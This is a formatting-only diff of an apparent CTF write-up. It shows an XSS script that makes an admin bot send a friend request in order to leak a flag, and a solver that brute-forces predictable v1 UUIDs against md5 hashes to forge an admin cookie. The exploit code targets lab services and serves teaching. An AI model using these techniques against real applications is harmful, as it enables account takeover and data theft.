@@ -52,10 +52,10 @@ You can metause our fancy new `metaadmin metabot` to get the admin to metaview y
 
 ```javascript
 accounts.set('admin', {
-	password: adminpw,
-	displayName: flag,
-	posts: [],
-	friends: []
+  password: adminpw,
+  displayName: flag,
+  posts: [],
+  friends: [],
 });
 ```
 
@@ -65,18 +65,25 @@ bot이 제공되었기 때문에 `xss`를 이용하여 `displayName`을 릭할 �
 
 ```javascript
 app.post('/login', (req, res) => {
-	if (typeof req.body.username !== 'string' || typeof req.body.password !== 'string') {
-		res.redirect('/login#' + encodeURIComponent('Please metafill out all the metafields.'));
-		return;
-	}
-	const username = req.body.username.trim();
-	const password = req.body.password.trim();
-	if (accounts.has(username) && accounts.get(username).password === password) {
-		res.cookie('login', `${username}:${password}`, { httpOnly: true });
-		res.redirect('/');
-	} else {
-		res.redirect('/login#' + encodeURIComponent('Wrong metausername/metapassword.'));
-	}
+  if (
+    typeof req.body.username !== 'string' ||
+    typeof req.body.password !== 'string'
+  ) {
+    res.redirect(
+      '/login#' + encodeURIComponent('Please metafill out all the metafields.'),
+    );
+    return;
+  }
+  const username = req.body.username.trim();
+  const password = req.body.password.trim();
+  if (accounts.has(username) && accounts.get(username).password === password) {
+    res.cookie('login', `${username}:${password}`, { httpOnly: true });
+    res.redirect('/');
+  } else {
+    res.redirect(
+      '/login#' + encodeURIComponent('Wrong metausername/metapassword.'),
+    );
+  }
 });
 ```
 
@@ -86,34 +93,34 @@ app.post('/login', (req, res) => {
 
 ```javascript
 app.post('/friend', needsAuth, (req, res) => {
-	res.type('text/plain');
-	const username = req.body.username.trim();
-	if (!accounts.has(username)) {
-		res.status(400).send("Metauser doesn't metaexist");
-	} else {
-		const user = accounts.get(username);
-		if (user.friends.includes(res.locals.user)) {
-			res.status(400).send('Already metafriended');
-		} else {
-			user.friends.push(res.locals.user);
-			res.status(200).send('ok');
-		}
-	}
+  res.type('text/plain');
+  const username = req.body.username.trim();
+  if (!accounts.has(username)) {
+    res.status(400).send("Metauser doesn't metaexist");
+  } else {
+    const user = accounts.get(username);
+    if (user.friends.includes(res.locals.user)) {
+      res.status(400).send('Already metafriended');
+    } else {
+      user.friends.push(res.locals.user);
+      res.status(200).send('ok');
+    }
+  }
 });
 
 app.get('/friends', needsAuth, (req, res) => {
-	res.type('application/json');
-	res.send(
-		JSON.stringify(
-			accounts
-				.get(res.locals.user)
-				.friends.filter((username) => accounts.has(username))
-				.map((username) => ({
-					username,
-					displayName: accounts.get(username).displayName
-				}))
-		)
-	);
+  res.type('application/json');
+  res.send(
+    JSON.stringify(
+      accounts
+        .get(res.locals.user)
+        .friends.filter((username) => accounts.has(username))
+        .map((username) => ({
+          username,
+          displayName: accounts.get(username).displayName,
+        })),
+    ),
+  );
 });
 ```
 
@@ -123,13 +130,13 @@ app.get('/friends', needsAuth, (req, res) => {
 
 ```html
 <script>
-	fetch('http://metaverse:8080/friend', {
-		method: 'POST',
-		body: 'username=bmcyver',
-		headers: {
-			'Content-Type': 'application/x-www-form-urlencoded'
-		}
-	});
+  fetch('http://metaverse:8080/friend', {
+    method: 'POST',
+    body: 'username=bmcyver',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded',
+    },
+  });
 </script>
 ```
 
@@ -161,50 +168,54 @@ UUIDs are the best! I love them (if you couldn't tell)!
 
 ```javascript
 function randomUUID() {
-	return uuid.v1({ node: [0x67, 0x69, 0x6e, 0x6b, 0x6f, 0x69], clockseq: 0b10101001100100 });
+  return uuid.v1({
+    node: [0x67, 0x69, 0x6e, 0x6b, 0x6f, 0x69],
+    clockseq: 0b10101001100100,
+  });
 }
 
 function getUsers() {
-	let output = '<strong>Admin users:</strong>\n';
-	adminuuids.forEach((adminuuid) => {
-		const hash = crypto // [!code highlight:4]
-			.createHash('md5')
-			.update('admin' + adminuuid)
-			.digest('hex');
-		output += `<tr><td>${hash}</td></tr>\n`;
-	});
-	output += '<br><br><strong>Regular users:</strong>\n';
-	useruuids.forEach((useruuid) => {
-		const hash = crypto.createHash('md5').update(useruuid).digest('hex');
-		output += `<tr><td>${hash}</td></tr>\n`;
-	});
-	return output;
+  let output = '<strong>Admin users:</strong>\n';
+  adminuuids.forEach((adminuuid) => {
+    const hash = crypto // [!code highlight:4]
+      .createHash('md5')
+      .update('admin' + adminuuid)
+      .digest('hex');
+    output += `<tr><td>${hash}</td></tr>\n`;
+  });
+  output += '<br><br><strong>Regular users:</strong>\n';
+  useruuids.forEach((useruuid) => {
+    const hash = crypto.createHash('md5').update(useruuid).digest('hex');
+    output += `<tr><td>${hash}</td></tr>\n`;
+  });
+  return output;
 }
 
 app.get('/', (req, res) => {
-	let id = req.cookies['id'];
-	if (id === undefined || !isUuid(id)) {
-		id = randomUUID();
-		res.cookie('id', id);
-		useruuids.push(id);
-		if (useruuids.length > 50) {
-			useruuids.shift();
-		}
-	} else if (isAdmin(id)) { // [!code highlight:4]
-		res.send(process.env.FLAG); 
-		return;
-	}
+  let id = req.cookies['id'];
+  if (id === undefined || !isUuid(id)) {
+    id = randomUUID();
+    res.cookie('id', id);
+    useruuids.push(id);
+    if (useruuids.length > 50) {
+      useruuids.shift();
+    }
+  } else if (isAdmin(id)) {
+    // [!code highlight:4]
+    res.send(process.env.FLAG);
+    return;
+  }
 
-	res.send('You are logged in as ' + id + '<br><br>' + getUsers());
+  res.send('You are logged in as ' + id + '<br><br>' + getUsers());
 });
 
 app.post('/createadmin', (req, res) => {
-	const adminid = randomUUID();
-	adminuuids.push(adminid);
-	if (adminuuids.length > 50) {
-		adminuuids.shift();
-	}
-	res.send('Admin account created.');
+  const adminid = randomUUID();
+  adminuuids.push(adminid);
+  if (adminuuids.length > 50) {
+    adminuuids.shift();
+  }
+  res.send('Admin account created.');
 });
 ```
 
@@ -215,32 +226,34 @@ app.post('/createadmin', (req, res) => {
 import { create } from '@web';
 import { logger, md5 } from '@utils';
 const r = create({
-	baseURL: 'http://localhost:8080'
+  baseURL: 'http://localhost:8080',
 });
 
 logger.info('Starting to create admins...');
 
 for (let i = 0; i < 25; i++) {
-	await r.post('/createadmin');
+  await r.post('/createadmin');
 }
 let currentUUID = await r
-	.get<string>('/')
-	.then((res) => res.data.split('You are logged in as ')[1].split('<br>')[0].trim());
+  .get<string>('/')
+  .then((res) =>
+    res.data.split('You are logged in as ')[1].split('<br>')[0].trim(),
+  );
 
 for (let i = 0; i < 25; i++) {
-	await r.post('/createadmin');
+  await r.post('/createadmin');
 }
 
 const hashedUUIDs = await r
-	.get<string>('/')
-	.then((res) =>
-		res.data
-			.split('<strong>Admin users:</strong>')[1]
-			.split('<br><br><strong>Regular users:</strong>')[0]
-			.replaceAll('<tr><td>', '')
-			.replaceAll('</td></tr>', '')
-			.split('\n')
-	);
+  .get<string>('/')
+  .then((res) =>
+    res.data
+      .split('<strong>Admin users:</strong>')[1]
+      .split('<br><br><strong>Regular users:</strong>')[0]
+      .replaceAll('<tr><td>', '')
+      .replaceAll('</td></tr>', '')
+      .split('\n'),
+  );
 
 const header = currentUUID.substring(0, 2);
 logger.info(`Current UUID: ${currentUUID}, Header: ${header}`);
@@ -248,26 +261,26 @@ currentUUID = currentUUID.slice(8);
 
 const hexChars = '0123456789abcdef';
 async function checkAdmin() {
-	for (let i = 0; i < hexChars.length; i++) {
-		logger.info(`Trying ${i + 1}/${hexChars.length}`);
-		for (let j = 0; j < hexChars.length; j++) {
-			for (let k = 0; k < hexChars.length; k++) {
-				for (let l = 0; l < hexChars.length; l++) {
-					for (let m = 0; m < hexChars.length; m++) {
-						for (let n = 0; n < hexChars.length; n++) {
-							const hex = `${hexChars[i]}${hexChars[j]}${hexChars[k]}${hexChars[l]}${hexChars[m]}${hexChars[n]}`;
-							const hash = md5(`admin${header}${hex}${currentUUID}`);
-							if (hashedUUIDs.includes(hash)) {
-								r.setCookie('id', `${header}${hex}${currentUUID}`);
-								logger.info(`Found the admin: ${hash}`);
-								return;
-							}
-						}
-					}
-				}
-			}
-		}
-	}
+  for (let i = 0; i < hexChars.length; i++) {
+    logger.info(`Trying ${i + 1}/${hexChars.length}`);
+    for (let j = 0; j < hexChars.length; j++) {
+      for (let k = 0; k < hexChars.length; k++) {
+        for (let l = 0; l < hexChars.length; l++) {
+          for (let m = 0; m < hexChars.length; m++) {
+            for (let n = 0; n < hexChars.length; n++) {
+              const hex = `${hexChars[i]}${hexChars[j]}${hexChars[k]}${hexChars[l]}${hexChars[m]}${hexChars[n]}`;
+              const hash = md5(`admin${header}${hex}${currentUUID}`);
+              if (hashedUUIDs.includes(hash)) {
+                r.setCookie('id', `${header}${hex}${currentUUID}`);
+                logger.info(`Found the admin: ${hash}`);
+                return;
+              }
+            }
+          }
+        }
+      }
+    }
+  }
 }
 
 await checkAdmin();
